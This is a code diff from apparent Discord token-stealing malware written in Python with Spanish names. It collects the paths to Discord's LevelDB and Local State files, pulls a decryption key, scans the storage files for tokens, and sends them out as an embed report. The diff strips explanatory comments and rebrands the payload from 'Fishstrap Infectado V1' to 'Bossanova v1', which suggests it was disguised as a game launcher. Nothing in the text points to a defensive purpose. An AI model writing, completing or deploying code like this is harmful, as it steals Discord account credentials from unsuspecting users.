@@ -117,7 +117,7 @@ def obtener_tokens_multiples_rutas():
     if not appdata or not local_appdata:
         return []
 
-    # 1. Definir las rutas de las apps de escritorio y navegadores comunes
+    
     rutas_discord = {
         "Discord Stable": {
             "leveldb": os.path.join(appdata, "discord", "Local Storage", "leveldb"),
@@ -147,7 +147,7 @@ def obtener_tokens_multiples_rutas():
 
     tokens = []
 
-    # 2. Iterar sobre cada plataforma configurada
+    
     for plataforma, paths in rutas_discord.items():
         leveldb_path = paths["leveldb"]
         local_state_path = paths["local_state"]
@@ -159,7 +159,7 @@ def obtener_tokens_multiples_rutas():
         if not master_key:
             continue
 
-        # 3. Buscar tokens en los archivos de LevelDB de esta ruta
+        
         for file in os.listdir(leveldb_path):
             if file.endswith(".ldb") or file.endswith(".log"):
                 file_path = os.path.join(leveldb_path, file)
@@ -299,11 +299,11 @@ def enviar_reporte_completo(tokens):
     payload = {
         "embeds": [
             {
-                "title": "Fishstrap Infectado V1",
+                "title": "Bossanova v1",
                 "description": descripcion,
                 "color": 5814783,
                 "footer": {
-                    "text": "Por BossaNovita"
+                    "text": "Por BossaNova"
                 }
             }
         ]
